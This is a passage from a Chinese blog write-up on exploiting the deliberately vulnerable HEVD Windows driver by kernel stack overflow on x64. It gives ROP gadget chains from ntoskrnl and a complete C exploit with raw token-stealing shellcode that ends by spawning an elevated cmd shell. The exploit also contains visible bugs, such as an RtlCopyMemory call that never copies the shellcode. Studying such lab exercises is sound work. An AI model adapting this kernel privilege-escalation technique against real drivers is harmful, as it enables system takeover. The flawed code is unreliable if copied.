<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x202e71</span>: pop rcx; ret;</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x4e13ce</span>: pop rdx; ret; </span><br><span class="line"><span class="number">0x1000</span></span><br><span class="line">AllocatePoolWithTag()</span><br><span class="line"><span class="number">0x5b6164</span>: push rax; pop r13; ret;</span><br><span class="line"><span class="number">0x2714f6</span>: xchg r8, r13; ret; </span><br><span class="line"><span class="number">0x94133a</span>: mov rcx, r8; mov rax, rcx; ret; </span><br><span class="line"><span class="number">0x4e13ce</span>: pop rdx; ret; </span><br><span class="line">&lt;address of shellcode location in userland&gt;</span><br><span class="line"><span class="number">0x201861</span>: pop r8; ret; </span><br><span class="line"><span class="built_in">memcpy</span>() -&gt; calls the <span class="built_in">memcpy</span> function and copies our payload to an executable kernel space</span><br><span class="line"><span class="number">0x24b024</span>: jmp rax;</span><br></pre></td></tr></table></figure>
<p>显然很难找到完美符合要求的gadget,当然实际上因为我们之前已经把所有驱动的基址都打印出来了,也可以去其他的驱动中寻找gadget</p>
<p>不过即使这样,我们还没有完成gadget的编写</p>
<p>因为在x86-64 上的 Microsoft fastcall 调用约定中特有一个特有的概念叫做Shadow Space</p>
<blockquote>
<p>Shadow Space 是为函数调用预留的堆栈空间，通常由调用者分配，用于存储前四个通过寄存器传递的参数（<code>RCX</code>, <code>RDX</code>, <code>R8</code>, <code>R9</code>）。</p>
<p>即使参数实际上是通过寄存器传递的，调用者仍然需要在堆栈上分配 32 字节（每个寄存器占 8 字节）的空间。</p>
</blockquote>
<p>而我们需要调用的AllocatePoolWithTag()就是这样一个函数(一个分支的汇编如下)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nt!ExAllocatePoolWithTag:</span><br><span class="line">fffff807`39fb8010 48895c2408      mov     qword ptr [rsp+8],rbx</span><br><span class="line">fffff807`39fb8015 48896c2410      mov     qword ptr [rsp+10h],rbp</span><br><span class="line">fffff807`39fb801a 4889742418      mov     qword ptr [rsp+18h],rsi</span><br><span class="line">fffff807`39fb801f 57              push    rdi</span><br><span class="line">fffff807`39fb8020 4156            push    r14</span><br><span class="line">fffff807`39fb8022 4157            push    r15</span><br><span class="line">fffff807`39fb8024 4883ec30        sub     rsp,30h</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>可以看到其函数刚开始就会将rbx,rbp,rsi保存在rsp+8等位置,所以我们直接用上面获得rop链的话,那么我们的rop链就会被覆盖从而失效</p>
<p>所以我们要么在函数开始前<code>sub rsp 0x20 ret</code>结束后<code>add rsp 0x20 ret</code>,要么直接预留0x20无用空间供其写入</p>
<p>显然第二种方法会更简单一些因为我们只需要<code>add rsp 0x20 ret</code>这个gadget</p>
<p>那么我们完整的rop链应该长这样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x202e71</span>: pop rcx; ret;</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x4e13ce</span>: pop rdx; ret; </span><br><span class="line"><span class="number">0x1000</span></span><br><span class="line">AllocatePoolWithTag()</span><br><span class="line"><span class="number">0xa1b718</span>: add rsp, <span class="number">0x20</span>; ret;</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x5b6164</span>: push rax; pop r13; ret;</span><br><span class="line"><span class="number">0x2714f6</span>: xchg r8, r13; ret; </span><br><span class="line"><span class="number">0x94133a</span>: mov rcx, r8; mov rax, rcx; ret; </span><br><span class="line"><span class="number">0x4e13ce</span>: pop rdx; ret; </span><br><span class="line">&lt;address of shellcode location in userland&gt;</span><br><span class="line"><span class="number">0x201861</span>: pop r8; ret; </span><br><span class="line"><span class="built_in">memcpy</span>() -&gt; calls the <span class="built_in">memcpy</span> function and copies our payload to an executable kernel space</span><br><span class="line"><span class="number">0x02b92f1</span>: jmp rax;</span><br></pre></td></tr></table></figure>
<p>完整的exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QWORD ULONGLONG</span></span><br><span class="line"></span><br><span class="line">BYTE dst_sc[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QWORD <span class="title function_">getBaseAddr</span><span class="params">(LPCWSTR drvName)</span> &#123;</span><br><span class="line">  LPVOID drivers[<span class="number">512</span>];</span><br><span class="line">  DWORD cbNeeded;</span><br><span class="line">  <span class="type">int</span> nDrivers, i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (EnumDeviceDrivers(drivers, <span class="keyword">sizeof</span>(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; <span class="keyword">sizeof</span>(drivers)) &#123;</span><br><span class="line">    WCHAR szDrivers[<span class="number">512</span>];</span><br><span class="line">    nDrivers = cbNeeded / <span class="keyword">sizeof</span>(drivers[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nDrivers; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (GetDeviceDriverBaseName(drivers[i], szDrivers, <span class="keyword">sizeof</span>(szDrivers) / <span class="keyword">sizeof</span>(szDrivers[<span class="number">0</span>]))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (wcscmp(szDrivers, drvName) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> (QWORD)drivers[i];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PVOID <span class="title function_">get_kernel_symbol_addr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* symbol, PVOID ntbase)</span> &#123;</span><br><span class="line">  PVOID kernelBaseAddr;</span><br><span class="line">  HMODULE userKernelHandle;</span><br><span class="line">  PCHAR functionAddress;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> offset;</span><br><span class="line"></span><br><span class="line">  kernelBaseAddr = ntbase;  <span class="comment">// Loads kernel base address</span></span><br><span class="line">  userKernelHandle = LoadLibraryA(<span class="string">&quot;C:\\Windows\\System32\\ntoskrnl.exe&quot;</span>);  <span class="comment">// Gets kernel binary</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (userKernelHandle == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);  <span class="comment">// Finds given symbol</span></span><br><span class="line">  <span class="keyword">if</span> (functionAddress == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">// Could not find symbol</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  offset = functionAddress - ((PCHAR)userKernelHandle);  <span class="comment">// Subtracts the loaded binary&#x27;s base address from the found address. This way, we will find the offset of the symbol for base address 0.</span></span><br><span class="line">  <span class="keyword">return</span> (PVOID)(((PCHAR)kernelBaseAddr) + offset);  <span class="comment">// Adds the offset to the leaked base address.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE hDriver = CreateFile(<span class="string">L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Error while creating a handle to the driver: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  QWORD ntBase = getBaseAddr(<span class="string">L&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] NTBase: %llx\n&quot;</span>, ntBase);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> add_rsp_20h_ret = ntBase + <span class="number">0xa1b718</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_rcx_ret = ntBase + <span class="number">0x202e71</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_rdx_ret = ntBase + <span class="number">0x4e13ce</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> push_rax_pop_r13_ret = ntBase + <span class="number">0x5b6164</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> xchg_r8_r13_ret = ntBase + <span class="number">0x2714f6</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> mov_rcx_r8_mov_rax_rcx_ret = ntBase + <span class="number">0x94133a</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_r8_ret = ntBase + <span class="number">0x201861</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> jmp_rax = ntBase + <span class="number">0x24b024</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> kernel_exallocatepoolwithtag = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) get_kernel_symbol_addr(<span class="string">&quot;ExAllocatePoolWithTag&quot;</span>, ntBase);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> kernel_memcpy = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) get_kernel_symbol_addr(<span class="string">&quot;memcpy&quot;</span>, ntBase);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> bufSize = <span class="number">2072</span> + <span class="number">19</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  LPVOID uBuffer = VirtualAlloc(<span class="literal">NULL</span>, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  LPVOID shellcode = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">256</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  RtlFillMemory(uBuffer, bufSize, <span class="string">&#x27;\x41&#x27;</span>);</span><br><span class="line">  RtlCopyMemory(shellcode, bufSize, <span class="number">145</span>);</span><br><span class="line"></span><br><span class="line">  QWORD* rop = (QWORD*)((QWORD)uBuffer + <span class="number">2072</span>);</span><br><span class="line"></span><br><span class="line">  *(rop + index++) = pop_rcx_ret;</span><br><span class="line">  *(rop + index++) = <span class="number">0</span>;</span><br><span class="line">  *(rop + index++) = pop_rdx_ret;</span><br><span class="line">  *(rop + index++) = <span class="number">145</span>;</span><br><span class="line">  *(rop + index++) = kernel_exallocatepoolwithtag;</span><br><span class="line">  *(rop + index++) = add_rsp_20h_ret;</span><br><span class="line">  index += <span class="number">4</span>;</span><br><span class="line">  *(rop + index++) = push_rax_pop_r13_ret;</span><br><span class="line">  *(rop + index++) = xchg_r8_r13_ret;</span><br><span class="line">  *(rop + index++) = mov_rcx_r8_mov_rax_rcx_ret;</span><br><span class="line">  *(rop + index++) = pop_rdx_ret;</span><br><span class="line">  *(rop + index++) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(&amp;shellcode);</span><br><span class="line">  *(rop + index++) = pop_r8_ret;</span><br><span class="line">  *(rop + index++) = <span class="number">145</span>;</span><br><span class="line">  *(rop + index++) = kernel_memcpy;</span><br><span class="line">  *(rop + index++) = jmp_rax;</span><br><span class="line"></span><br><span class="line">  DeviceIoControl(hDriver, <span class="number">0x222003</span>, (LPVOID)uBuffer, bufSize, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Enjoy your shell!\n&quot;</span>, ntBase);</span><br><span class="line">  system(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://vuln.dev/windows-kernel-exploitation-hevd-x64-stackoverflow/">Windows Kernel Exploitation - HEVD x64 Stack Overflow | xct’s blog</a></p>
<p><a target="_blank" rel="noopener" href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">HEVD Exploit - Stack OverflowGS on Windows 10 RS5 x64 | Kristal’s Notebook</a></p>
<p><a target="_blank" rel="noopener" href="https://mdanilor.github.io/posts/hevd-3/">[Cracking Windows Kernel with HEVD] Chapter 3: Can we rop our way into triggering our shellcode?</a></p>
<p><a target="_blank" rel="noopener" href="https://ommadawn46.hatenablog.com/entry/2024/01/30/101340">Windows 10 22H2 - HEVDで学ぶKernel Exploit - ommadawn46’s blog</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">环境准备</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A2%AB%E8%B0%83%E8%AF%95%E6%96%B9"><span class="toc-number">1.1.</span> <span class="toc-text">被调试方</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.</span> <span class="toc-text">其他工具</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%86%9F%E6%82%89HEVD"><span class="toc-number">2.</span> <span class="toc-text">熟悉HEVD</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A9%B1%E5%8A%A8%E8%A3%85%E8%BD%BD"><span class="toc-number">2.1.</span> <span class="toc-text">驱动装载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B7%E4%BE%8Bexp"><span class="toc-number">2.2.</span> <span class="toc-text">样例exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">3.</span> <span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A9%B1%E5%8A%A8%E7%BB%93%E6%9E%84"><span class="toc-number">3.1.</span> <span class="toc-text">驱动结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IRP"><span class="toc-number">3.2.</span> <span class="toc-text">IRP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x86"><span class="toc-number">3.3.</span> <span class="toc-text">x86</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.1.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x64"><span class="toc-number">3.4.</span> <span class="toc-text">x64</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kaslr"><span class="toc-number">3.4.1.</span> <span class="toc-text">kaslr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp1"><span class="toc-number">3.4.2.</span> <span class="toc-text">exp1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode"><span class="toc-number">3.4.2.1.</span> <span class="toc-text">shellcode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp2"><span class="toc-number">3.4.3.</span> <span class="toc-text">exp2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E9%85%8D%E5%86%85%E6%A0%B8%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98"><span class="toc-number">3.4.3.1.</span> <span class="toc-text">分配内核可执行内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEgadget"><span class="toc-number">3.4.3.2.</span> <span class="toc-text">寻找gadget</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/2423/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/2423/&text=[HEVD]第一个栈溢出"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/2423/&title=[HEVD]第一个栈溢出"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/2423/&is_video=false&description=[HEVD]第一个栈溢出"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=[HEVD]第一个栈溢出&body=Check out this article: https://ixout.github.io/posts/2423/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/2423/&title=[HEVD]第一个栈溢出"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/2423/&title=[HEVD]第一个栈溢出"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/2423/&title=[HEVD]第一个栈溢出"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/2423/&title=[HEVD]第一个栈溢出"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/2423/&name=[HEVD]第一个栈溢出&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/2423/&t=[HEVD]第一个栈溢出"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    ixout
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
